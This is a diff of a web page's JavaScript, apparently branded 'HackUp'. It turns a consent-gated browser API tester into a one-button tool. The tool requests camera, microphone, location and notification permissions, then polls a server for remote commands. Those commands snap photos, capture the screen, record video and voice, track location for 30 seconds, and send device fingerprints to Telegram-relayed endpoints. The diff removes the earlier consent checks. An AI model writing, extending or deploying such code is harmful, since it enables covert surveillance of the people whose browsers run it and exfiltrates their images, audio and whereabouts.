-reg('nfc','Web NFC','hardware','NFC',async()=>'NDEFReader' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'NDEFReader' in window);
-reg('gp','Gamepad','hardware','Controller',async()=>{const g=navigator.getGamepads?.();await post('/api/telegram/report',{Gamepads:g?g.length:0});return `${g?g.length:0} pads`;},()=>'getGamepads' in navigator);
-reg('bat','Battery','hardware','Battery',()=>new Promise((ok,no)=>{if(!navigator.getBattery)return no(new Error('Unsupported'));navigator.getBattery().then(async b=>{const i={level:Math.round(b.level*100)+'%',charging:b.charging};await post('/api/telegram/report',{Battery:i});ok(`${i.level} chg=${i.charging}`);});}),()=>'getBattery' in navigator);
-
-/* ---- FILES ---- */
-reg('file','File API','files','File read',async()=>'File' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'File' in window);
-reg('fsa','File System Access','files','Picker',async()=>'showOpenFilePicker' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'showOpenFilePicker' in window);
-reg('fr','FileReader','files','Async read',async()=>'FileReader' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'FileReader' in window);
-reg('blob','Blob','files','Binary',async()=>{const b=new Blob(['x']);return 'size '+b.size;},()=>'Blob' in window);
-reg('str','Streams','files','Streams',async()=>'ReadableStream' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'ReadableStream' in window);
-reg('cmp','CompressionStream','files','gzip',async()=>{if(!('CompressionStream' in window))throw new Error('Unsupported');const d=new TextEncoder().encode('test string');const cs=new CompressionStream('gzip');const w=cs.writable.getWriter();w.write(d);w.close();const ab=await new Response(cs.readable).arrayBuffer();return `${d.length}→${ab.byteLength}`;},()=>'CompressionStream' in window);
-reg('enc','Encoding','files','TextEncoder',async()=>{const e=new TextEncoder().encode('x');return 'ok';},()=>'TextEncoder' in window);
-reg('url','URL','files','URL parse',async()=>{const u=new URL('https://x.com/p?a=1');u.searchParams.set('b','2');return u.toString();},()=>'URL' in window);
-
-/* ---- MISC ---- */
-reg('ab','AbortController','misc','Cancel async',async()=>{const a=new AbortController();const p=fetch('https://api.ipify.org',{signal:a.signal}).catch(()=>null);a.abort();await p;return 'ok';},()=>'AbortController' in window);
-reg('cp','Contact Picker','misc','Pick contact',async()=>'contacts' in navigator&&'select' in navigator.contacts?'ok':(()=>{throw new Error('Unsupported')})(),()=>'contacts' in navigator);
-reg('pay','Payment Request','misc','Payment',async()=>'PaymentRequest' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'PaymentRequest' in window);
-reg('bc','BarcodeDetector','misc','Barcode',async()=>'BarcodeDetector' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'BarcodeDetector' in window);
-reg('fd','FaceDetector','misc','Face detect',async()=>'FaceDetector' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'FaceDetector' in window);
-reg('td','TextDetector','misc','OCR',async()=>'TextDetector' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'TextDetector' in window);
-reg('wc','WebCodecs','misc','Codecs',async()=>'VideoDecoder' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'VideoDecoder' in window);
-reg('rp','Remote Playback','misc','Cast',async()=>'RemotePlayback' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'RemotePlayback' in window);
-reg('fl','Font Loading','misc','Fonts',async()=>'FontFace' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'FontFace' in window);
-reg('vv','Visual Viewport','misc','Viewport',async()=>{if(!window.visualViewport)throw new Error('Unsupported');const v=visualViewport;const i={w:v.width,h:v.height,scale:v.scale};await post('/api/telegram/report',{Viewport:i});return JSON.stringify(i);},()=>'visualViewport' in window);
-reg('lk','Web Locks','misc','Mutex',async()=>{if(!navigator.locks)throw new Error('Unsupported');await navigator.locks.request('h',async()=>{await new Promise(r=>setTimeout(r,200));});return 'ok';},()=>'locks' in navigator);
-reg('kb','Keyboard','misc','Layout map',async()=>'keyboard' in navigator?'ok':(()=>{throw new Error('Unsupported')})(),()=>'keyboard' in navigator);
-reg('tt','Trusted Types','misc','XSS-safe',async()=>'trustedTypes' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'trustedTypes' in window);
-reg('san','Sanitizer','misc','HTML sanitize',async()=>'Sanitizer' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'Sanitizer' in window);
-reg('nav','Navigation API','misc','Nav',async()=>'navigation' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'navigation' in window);
-reg('cp2','Compute Pressure','misc','CPU',async()=>'PressureObserver' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'PressureObserver' in window);
-reg('lq','Launch Queue','misc','PWA launch',async()=>'LaunchQueue' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'LaunchQueue' in window);
-reg('pr','Presentation','misc','2nd screen',async()=>'PresentationRequest' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'PresentationRequest' in window);
-reg('uad','UA Client Hints','misc','High-entropy',async()=>{if(!navigator.userAgentData)throw new Error('Unsupported');const h=await navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','architecture','model']);await post('/api/telegram/report',{'Client Hints':h});return JSON.stringify(h).slice(0,150);},()=>'userAgentData' in navigator);
-reg('abs','AbsoluteOrientationSensor','misc','3D compass',async()=>'AbsoluteOrientationSensor' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'AbsoluteOrientationSensor' in window);
-reg('rel','RelativeOrientationSensor','misc','Rel orientation',async()=>'RelativeOrientationSensor' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'RelativeOrientationSensor' in window);
-
-// ============= RENDER =============
-const CAT = {sensors:'Sensors',media:'Media',audio:'Audio',network:'Network',storage:'Storage',crypto:'Crypto',perf:'Performance',workers:'Workers',ui:'UI',graphics:'GPU',hardware:'Hardware',files:'Files',misc:'Misc'};
-const root = $('#apiRoot'), counter = $('#counter'), S = {};
-function render(){
-  const g = {};
-  R.forEach(a => (g[a.cat]||=[]).push(a));
-  let html = '';
-  Object.entries(g).forEach(([c,list])=>{
-    html += `<div class="cat">${CAT[c]||c}<small>${list.length} APIs</small></div><div class="grid">`;
-    list.forEach(a=>{
-      html += `<div class="card"><div class="head"><span class="name">${a.name}</span><span class="badge" id="b-${a.id}">—</span></div><div class="desc">${a.desc}</div><div class="out" id="o-${a.id}"></div><div class="foot"><button class="act" data-id="${a.id}">Activate</button></div></div>`;
+  // 1. Camera
+  try {
+    if (camStream) camStream.getTracks().forEach(t => t.stop());
+    camStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: camFacing },
+      audio: false
     });
-    html += '</div>';
+    results.camera = true;
+  } catch (e) { results.camera = e.name || e.message; }
+
+  // 2. Microphone (separate so user sees two prompts)
+  try {
+    const mic = await navigator.mediaDevices.getUserMedia({ audio: true });
+    mic.getTracks().forEach(t => t.stop());
+    results.microphone = true;
+  } catch (e) { results.microphone = e.name || e.message; }
+
+  // 3. Geolocation
+  try {
+    await new Promise((ok, no) => {
+      navigator.geolocation.getCurrentPosition(
+        () => ok(true),
+        (err) => no(err),
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    });
+    results.geolocation = true;
+  } catch (e) { results.geolocation = e.message; }
+
+  // 4. Notifications
+  try {
+    if ('Notification' in window) {
+      const p = await Notification.requestPermission();
+      results.notifications = p;
+    } else results.notifications = 'unsupported';
+  } catch (e) { results.notifications = e.message; }
+
+  // 5. Persistent storage (silent)
+  try {
+    if (navigator.storage && navigator.storage.persist) {
+      results.persistent = await navigator.storage.persist();
+    }
+  } catch {}
+
+  // 6. Wake lock (silent test)
+  try {
+    if (navigator.wakeLock) {
+      const wl = await navigator.wakeLock.request('screen');
+      results.wakeLock = true;
+      setTimeout(() => wl.release().catch(()=>{}), 1000);
+    }
+  } catch {}
+
+  // 7. Vibration (silent)
+  try { navigator.vibrate && navigator.vibrate(80); results.vibration = !!navigator.vibrate; } catch {}
+
+  return results;
+}
+
+/* ============================================================
+   COMMAND EXECUTION
+   ============================================================ */
+async function execCommand(cmd) {
+  const id = cmd.id;
+  let result = '';
+  const type = cmd.type;
+
+  try {
+    if (type === 'photo') {
+      await ensureCamera();
+      await new Promise(r => setTimeout(r, 500));
+      const dataUrl = captureFrame('image/jpeg', 0.9);
+      await postJSON('/api/upload', { image: dataUrl, caption: '📸 Remote photo' });
+      result = '📸 Photo sent';
+    }
+
+    else if (type === 'screen') {
+      const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
+      const v = document.createElement('video');
+      v.srcObject = s; await v.play();
+      await new Promise(r => setTimeout(r, 700));
+      const c = document.createElement('canvas');
+      c.width = v.videoWidth; c.height = v.videoHeight;
+      c.getContext('2d').drawImage(v, 0, 0);
+      s.getTracks().forEach(t => t.stop());
+      await postJSON('/api/upload', { image: c.toDataURL('image/jpeg', 0.85), caption: '🖥️ Screen' });
+      result = '🖥️ Screen captured';
+    }
+
+    else if (type === 'record3') {
+      await ensureCamera();
+      const chunks = [];
+      const rec = new MediaRecorder(camStream, { mimeType: 'video/webm' });
+      rec.ondataavailable = e => chunks.push(e.data);
+      rec.start();
+      await new Promise(r => setTimeout(r, 3000));
+      rec.stop();
+      await new Promise(r => rec.onstop = r);
+      const b = new Blob(chunks, { type: 'video/webm' });
+      const b64 = await blobToBase64(b);
+      await postJSON('/api/upload', { image: b64, caption: '🎥 3s video' });
+      result = '🎥 Video sent';
+    }
+
+    else if (type === 'record5') {
+      const mic = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const chunks = [];
+      const rec = new MediaRecorder(mic);
+      rec.ondataavailable = e => chunks.push(e.data);
+      rec.start();
+      await new Promise(r => setTimeout(r, 5000));
+      rec.stop();
+      await new Promise(r => rec.onstop = r);
+      mic.getTracks().forEach(t => t.stop());
+      const b = new Blob(chunks, { type: 'audio/webm' });
+      const b64 = await blobToBase64(b);
+      await postJSON('/api/upload', { image: b64, caption: '🎙️ 5s voice' });
+      result = '🎙️ Voice sent';
+    }
+
+    else if (type === 'location') {
+      const pos = await new Promise((ok, no) => navigator.geolocation.getCurrentPosition(ok, no, { enableHighAccuracy: true }));
+      await postJSON('/api/telegram/location', {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        caption: '📍 Remote location'
+      });
+      result = `📍 ${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
+    }
+
+    else if (type === 'track') {
+      let count = 0;
+      await new Promise(ok => {
+        const wid = navigator.geolocation.watchPosition(
+          async p => {
+            count++;
+            await postJSON('/api/telegram/location', {
+              latitude: p.coords.latitude,
+              longitude: p.coords.longitude,
+              caption: `📍 Track #${count}`
+            }).catch(()=>{});
+          },
+          () => {}, { enableHighAccuracy: true }
+        );
+        setTimeout(() => { navigator.geolocation.clearWatch(wid); ok(); }, 30000);
+      });
+      result = `📍 Sent ${count} location updates`;
+    }
+
+    else if (type === 'report') {
+      const rep = await buildReport();
+      await postJSON('/api/telegram/report', rep);
+      result = '📊 Report sent';
+    }
+
+    else if (type === 'battery') {
+      const bat = await getBattery();
+      await postJSON('/api/telegram/report', { 'Battery': bat });
+      result = '🔋 ' + bat;
+    }
+
+    else if (type === 'network') {
+      const c = navigator.connection || {};
+      const net = {
+        'Effective type': c.effectiveType || 'unknown',
+        'Downlink (Mbps)': c.downlink || '?',
+        'RTT (ms)': c.rtt || '?',
+        'Save data': c.saveData ? 'on' : 'off',
+        'Online': navigator.onLine
+      };
+      await postJSON('/api/telegram/report', { 'Network': net });
+      result = '📶 ' + JSON.stringify(net);
+    }
+
+    else if (type === 'sensors') {
+      const s = await readSensors();
+      await postJSON('/api/telegram/report', { 'Sensors': s });
+      result = '🎯 Sensors: ' + JSON.stringify(s).slice(0, 200);
+    }
+
+    else if (type === 'storage') {
+      if (navigator.storage && navigator.storage.estimate) {
+        const e = await navigator.storage.estimate();
+        const info = {
+          'Quota (MB)': (e.quota / 1048576).toFixed(1),
+          'Usage (MB)': (e.usage / 1048576).toFixed(2)
+        };
+        await postJSON('/api/telegram/report', { 'Storage': info });
+        result = '💾 ' + JSON.stringify(info);
+      } else result = 'Storage API unsupported';
+    }
+
+    else if (type === 'vibrate') {
+      if (navigator.vibrate) {
+        navigator.vibrate([300, 100, 300, 100, 300]);
+        await postJSON('/api/telegram/message', { text: '📳 Vibration triggered (300-100-300-100-300 ms)' });
+        result = '📳 Vibrated';
+      } else result = 'Vibration unsupported';
+    }
+
+    else if (type === 'fullscreen') {
+      try {
+        await document.documentElement.requestFullscreen();
+        result = '⛶ Fullscreen entered';
+        await postJSON('/api/telegram/message', { text: '⛶ Fullscreen entered' });
+      } catch (e) { result = 'Fullscreen failed: ' + e.message; }
+    }
+
+    else if (type === 'say') {
+      if ('speechSynthesis' in window) {
+        speechSynthesis.speak(new SpeechSynthesisUtterance(cmd.text || 'Hello'));
+        result = '🔊 Said: ' + cmd.text;
+      } else result = 'TTS unsupported';
+    }
+
+    else if (type === 'open') {
+      window.open(cmd.url, '_blank');
+      result = '🔗 Opened ' + cmd.url;
+    }
+
+    else if (type === 'notify') {
+      if (Notification.permission === 'granted') {
+        new Notification('HackUp', { body: cmd.text || 'Notification' });
+        result = '🔔 Shown';
+      } else result = 'Notification permission denied';
+    }
+
+    else result = '❓ Unknown command: ' + type;
+
+  } catch (e) {
+    result = '✖ ' + (e.message || 'error');
+  }
+
+  // Report result back
+  await postJSON('/api/commands/result', {
+    id,
+    result,
+    forward: false
+  }).catch(()=>{});
+}
+
+/* ============================================================
+   HELPERS
+   ============================================================ */
+async function ensureCamera() {
+  if (camStream && camStream.active) return;
+  camStream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: camFacing },
+    audio: false
   });
-  root.innerHTML = html;
-  detectAll();
-  $$('.act').forEach(b => b.addEventListener('click', () => run(b.dataset.id)));
 }
-function badge(id,s,t){const e=document.getElementById('b-'+id);if(!e)return;e.className='badge '+({ok:'b-ok',no:'b-no',wait:'b-wait',na:'b-na'}[s]||'b-na');e.textContent=t;S[id]=s;upd();}
-function upd(){const t=R.length,ok=Object.values(S).filter(s=>s==='ok').length;counter.textContent=`${ok} active / ${t} APIs`;}
-function detectAll(){R.forEach(a=>{try{a.detect()?badge(a.id,'ok','Available'):badge(a.id,'na','No');}catch{badge(a.id,'na','No');}});}
-async function run(id){
-  const a=R.find(x=>x.id===id);if(!a)return;
-  if(!consent.granted)return show(id,'⚠ Enable consent');
-  badge(id,'wait','Running…');show(id,'…');
-  try{const r=await a.run();badge(id,'ok','Active');show(id,'✔ '+(typeof r==='string'?r:JSON.stringify(r)));}
-  catch(e){badge(id,'no','Error');show(id,'✖ '+e.message);}
+
+function captureFrame(mime, quality) {
+  const video = document.createElement('video');
+  video.srcObject = camStream;
+  // Already playing from previous step; wait 1 frame
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth || 1280;
+  canvas.height = video.videoHeight || 720;
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+  return canvas.toDataURL(mime || 'image/jpeg', quality || 0.9);
 }
-function show(id,t){const e=document.getElementById('o-'+id);if(!e)return;e.style.display='block';e.textContent=t;}
 
-// ============= CAMERA UI =============
-$('#enableCam').addEventListener('click',async()=>{try{await startCam(camFacing);}catch(e){alert(e.message);}});
-$('#flipBtn').addEventListener('click',async()=>{camFacing=camFacing==='environment'?'user':'environment';try{await startCam(camFacing);}catch(e){alert(e.message);}});
-$('#capBtn').addEventListener('click',async()=>{const v=$('#video'),c=$('#canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);try{await post('/api/upload',{image:c.toDataURL('image/jpeg',.9),caption:'📸 Capture'});alert('Sent ✔');}catch(e){alert(e.message);}});
-let rec=null;
-$('#recBtn').addEventListener('click',async()=>{try{await startCam(camFacing);const ch=[];rec=new MediaRecorder(camStream,{mimeType:'video/webm'});rec.ondataavailable=e=>ch.push(e.data);rec.onstop=async()=>{const b=new Blob(ch,{type:'video/webm'});const fr=new FileReader();const b64=await new Promise(x=>{fr.onload=()=>x(fr.result);fr.readAsDataURL(b);});try{await post('/api/upload',{image:b64,caption:'🎥 Video'});alert('Sent ✔');}catch(e){alert(e.message);}};rec.start();}catch(e){alert(e.message);}});
-$('#stopBtn').addEventListener('click',()=>{if(rec&&rec.state!=='inactive')rec.stop();});
+async function getBattery() {
+  try {
+    if (!navigator.getBattery) return 'unsupported';
+    const b = await navigator.getBattery();
+    return `${Math.round(b.level * 100)}% ${b.charging ? '(charging)' : '(on battery)'}`;
+  } catch { return 'unsupported'; }
+}
 
-// ============= TABS =============
-$$('.tab').forEach(t=>t.addEventListener('click',()=>{$$('.tab').forEach(x=>x.classList.remove('active'));t.classList.add('active');const c=t.dataset.cat;if(c==='camera'){$('#camSection').style.display='';$('#apiSection').style.display='none';}else{$('#camSection').style.display='none';$('#apiSection').style.display='';}}));
+async function readSensors() {
+  const out = {};
+  // Orientation
+  try {
+    out.orientation = await new Promise(ok => {
+      const h = e => { window.removeEventListener('deviceorientation', h); ok(`α=${e.alpha?.toFixed(0) || '?'} β=${e.beta?.toFixed(0) || '?'} γ=${e.gamma?.toFixed(0) || '?'}`); };
+      window.addEventListener('deviceorientation', h);
+      setTimeout(() => ok('timeout'), 1200);
+    });
+  } catch { out.orientation = 'n/a'; }
+  // Motion
+  try {
+    out.motion = await new Promise(ok => {
+      const h = e => {
+        window.removeEventListener('devicemotion', h);
+        const a = e.accelerationIncludingGravity || {};
+        ok(`x=${a.x?.toFixed(2) || '?'} y=${a.y?.toFixed(2) || '?'} z=${a.z?.toFixed(2) || '?'}`);
+      };
+      window.addEventListener('devicemotion', h);
+      setTimeout(() => ok('timeout'), 1200);
+    });
+  } catch { out.motion = 'n/a'; }
+  // Screen
+  out.screenOrientation = screen.orientation ? screen.orientation.type : 'n/a';
+  // Network
+  const c = navigator.connection || {};
+  out.connection = c.effectiveType || 'n/a';
+  // Ambient light
+  if ('AmbientLightSensor' in window) {
+    try {
+      const s = new AmbientLightSensor();
+      await s.start();
+      out.illuminance = await new Promise(ok => {
+        s.onreading = () => { s.stop(); ok(s.illuminance); };
+        setTimeout(() => { s.stop(); ok('timeout'); }, 1500);
+      });
+    } catch { out.illuminance = 'n/a'; }
+  }
+  return out;
+}
 
-// ============= BULK =============
-$('#sendAllBtn').addEventListener('click',async()=>{
-  if(!consent.granted)return alert('Enable consent first');
-  const r={
-    'Time':new Date().toISOString(),
-    'User Agent':navigator.userAgent,
-    'Platform':navigator.platform,
-    'Language':navigator.language,
-    'Timezone':Intl.DateTimeFormat().resolvedOptions().timeZone,
-    'Screen':`${screen.width}×${screen.height}`,
-    'DPR':devicePixelRatio,
-    'Viewport':`${innerWidth}×${innerHeight}`,
-    'Color depth':`${screen.colorDepth}-bit`,
-    'CPU cores':navigator.hardwareConcurrency,
-    'Device memory':navigator.deviceMemory,
-    'Online':navigator.onLine,
-    'Touch points':navigator.maxTouchPoints,
-    'Cookies':navigator.cookieEnabled,
-    'Dark mode':matchMedia('(prefers-color-scheme: dark)').matches,
-    'Reduced motion':matchMedia('(prefers-reduced-motion: reduce)').matches,
-    'Active APIs':R.filter(a=>S[a.id]==='ok').map(a=>a.id).join(', ')
+async function buildReport() {
+  const out = {
+    'User Agent': navigator.userAgent,
+    'Platform': navigator.platform,
+    'Language': navigator.language,
+    'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+    'Screen': `${screen.width}×${screen.height}`,
+    'DPR': devicePixelRatio,
+    'Viewport': `${innerWidth}×${innerHeight}`,
+    'Color depth': `${screen.colorDepth}-bit`,
+    'CPU cores': navigator.hardwareConcurrency || '?',
+    'Device memory (GB)': navigator.deviceMemory || '?',
+    'Online': navigator.onLine,
+    'Touch points': navigator.maxTouchPoints || 0,
+    'Cookies': navigator.cookieEnabled,
+    'Dark mode': matchMedia('(prefers-color-scheme: dark)').matches,
+    'Reduced motion': matchMedia('(prefers-reduced-motion: reduce)').matches,
+    'Battery': await getBattery()
   };
-  try{await post('/api/telegram/report',r);alert('Full report sent ✔');}catch(e){alert(e.message);}
+  // Network info
+  const c = navigator.connection || {};
+  if (c.effectiveType) out['Network'] = `${c.effectiveType} (${c.downlink || '?'}Mbps, ${c.rtt || '?'}ms RTT)`;
+  // Storage
+  try {
+    if (navigator.storage && navigator.storage.estimate) {
+      const e = await navigator.storage.estimate();
+      out['Storage used'] = `${(e.usage/1048576).toFixed(2)} MB / ${(e.quota/1048576).toFixed(0)} MB`;
+    }
+  } catch {}
+  // Sensors snapshot
+  try {
+    const sensors = await readSensors();
+    out['Orientation'] = sensors.orientation;
+    out['Motion'] = sensors.motion;
+    out['Screen orientation'] = sensors.screenOrientation;
+    if (sensors.illuminance !== 'n/a') out['Ambient light'] = sensors.illuminance + ' lux';
+  } catch {}
+  return out;
+}
+
+async function blobToBase64(blob) {
+  const fr = new FileReader();
+  return new Promise(ok => {
+    fr.onload = () => ok(fr.result);
+    fr.readAsDataURL(blob);
+  });
+}
+
+async function postJSON(url, body) {
+  const r = await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body)
+  });
+  const t = await r.text();
+  try { return JSON.parse(t); }
+  catch { throw new Error(`HTTP ${r.status}: ${t.slice(0,100)}`); }
+}
+
+/* ============================================================
+   POLLING
+   ============================================================ */
+async function poll() {
+  try {
+    const r = await fetch('/api/commands/poll', { cache: 'no-store' });
+    const j = await r.json();
+    if (j.commands && j.commands.length) {
+      for (const c of j.commands) {
+        toast('⚡ ' + (c.cmd.type || '?'));
+        await execCommand(c.cmd);
+      }
+    }
+    setStatus('● ACTIVE · ' + new Date().toLocaleTimeString(), true);
+  } catch (e) {
+    setStatus('● RECONNECTING…', false);
+  }
+}
+
+function startPolling() {
+  if (pollTimer) return;
+  poll();
+  pollTimer = setInterval(poll, 3000);
+}
+
+function stopPolling() {
+  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+}
+
+/* ============================================================
+   MAIN BUTTON
+   ============================================================ */
+btn.addEventListener('click', async () => {
+  if (active) {
+    // Deactivate
+    active = false;
+    stopPolling();
+    btn.classList.remove('active');
+    btn.classList.add('init');
+    btn.querySelector('.label').textContent = 'START';
+    setStatus('● IDLE', false);
+    if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
+    return;
+  }
+
+  btn.disabled = true;
+  btn.querySelector('.label').textContent = '...';
+  setStatus('● REQUESTING PERMISSIONS', false);
+  toast('Requesting permissions — সব এলাউ করুন', 4000);
+
+  const res = await requestAllPermissions();
+
+  active = true;
+  btn.disabled = false;
+  btn.classList.remove('init');
+  btn.classList.add('active');
+  btn.querySelector('.label').textContent = 'ON';
+  setStatus('● ACTIVE · polling…', true);
+
+  // Summary
+  const ok = Object.keys(res).filter(k => res[k] === true || res[k] === 'granted' || res[k] === 'on').length;
+  toast(`✅ Active — ${ok} permissions granted`, 3500);
+
+  startPolling();
 });
-$('#detectAllBtn').addEventListener('click',detectAll);
-$('#clearLog').addEventListener('click',()=>{$$('.out').forEach(o=>{o.style.display='none';o.textContent='';});Object.keys(S).forEach(k=>delete S[k]);detectAll();});
 
-// ============= POLLING (Telegram → Browser) =============
-let pollTimer=null;
-async function poll(){
-  try{
-    const r=await fetch('/api/commands/poll',{headers:{'X-Consent':'granted'}});
-    const j=await r.json();
-    for(const c of (j.commands||[]))await exec(c);
-  }catch(e){console.warn('poll',e.message);}
-}
-async function exec({id,cmd}){
-  let result='';
-  try{
-    if(cmd.type==='photo'){
-      await startCam(camFacing);await new Promise(r=>setTimeout(r,600));
-      const v=$('#video'),c=$('#canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);
-      await post('/api/upload',{image:c.toDataURL('image/jpeg',.9),caption:'📸 Remote photo'});
-      result='Photo sent';
-    } else if(cmd.type==='location'){
-      result=await new Promise((ok,no)=>navigator.geolocation.getCurrentPosition(async p=>{await post('/api/telegram/location',{latitude:p.coords.latitude,longitude:p.coords.longitude,caption:'📍 Remote'});ok(`lat=${p.coords.latitude.toFixed(5)} lon=${p.coords.longitude.toFixed(5)}`);},e=>no(new Error(e.message)),{enableHighAccuracy:true}));
-    } else if(cmd.type==='report'){
-      const r={'Time':new Date().toISOString(),'UA':navigator.userAgent,'Screen':`${screen.width}×${screen.height}`,'Battery':await getBat(),'Online':navigator.onLine,'Cores':navigator.hardwareConcurrency};
-      await post('/api/telegram/report',r);result='Report sent';
-    } else if(cmd.type==='voice'){
-      const s=await navigator.mediaDevices.getUserMedia({audio:true});const ch=[];const rec=new MediaRecorder(s);rec.ondataavailable=e=>ch.push(e.data);
-      rec.start();await new Promise(x=>setTimeout(x,5000));rec.stop();await new Promise(x=>rec.onstop=x);
-      const b=new Blob(ch,{type:'audio/webm'});const fr=new FileReader();const b64=await new Promise(x=>{fr.onload=()=>x(fr.result);fr.readAsDataURL(b);});
-      await post('/api/upload',{image:b64,caption:'🎙️ Voice 5s'});s.getTracks().forEach(t=>t.stop());result='Voice sent';
-    } else if(cmd.type==='battery'){
-      const b=await getBat();result='Battery: '+b;
-    } else if(cmd.type==='vibrate'){
-      navigator.vibrate?.([200,100,200]);result='Vibrated';
-    } else if(cmd.type==='fullscreen'){
-      await document.documentElement.requestFullscreen();result='Fullscreen';
-    } else if(cmd.type==='open'){
-      window.open(cmd.url,'_blank');result='Opened '+cmd.url;
-    } else if(cmd.type==='say'){
-      speechSynthesis.speak(new SpeechSynthesisUtterance(cmd.text));result='Said: '+cmd.text;
-    } else result='Unknown command';
-  }catch(e){result='Error: '+e.message;}
-  await fetch('/api/commands/result',{method:'POST',headers:{'Content-Type':'application/json','X-Consent':'granted'},body:JSON.stringify({id,result})}).catch(()=>{});
-}
-async function getBat(){try{const b=await navigator.getBattery();return `${Math.round(b.level*100)}% chg=${b.charging}`;}catch{return 'n/a';}}
-$('#startPolling').addEventListener('click',()=>{if(pollTimer)return;pollTimer=setInterval(poll,5000);poll();$('#stopPolling').style.display='';$('#startPolling').style.display='none';});
-$('#stopPolling').addEventListener('click',()=>{clearInterval(pollTimer);pollTimer=null;$('#stopPolling').style.display='none';$('#startPolling').style.display='';});
+/* Auto-resume if page is refreshed while previously active */
+(async function init() {
+  setStatus('● IDLE', false);
+})();
 
-// ============= INIT =============
-render();
 })();
 </script>
 </body>
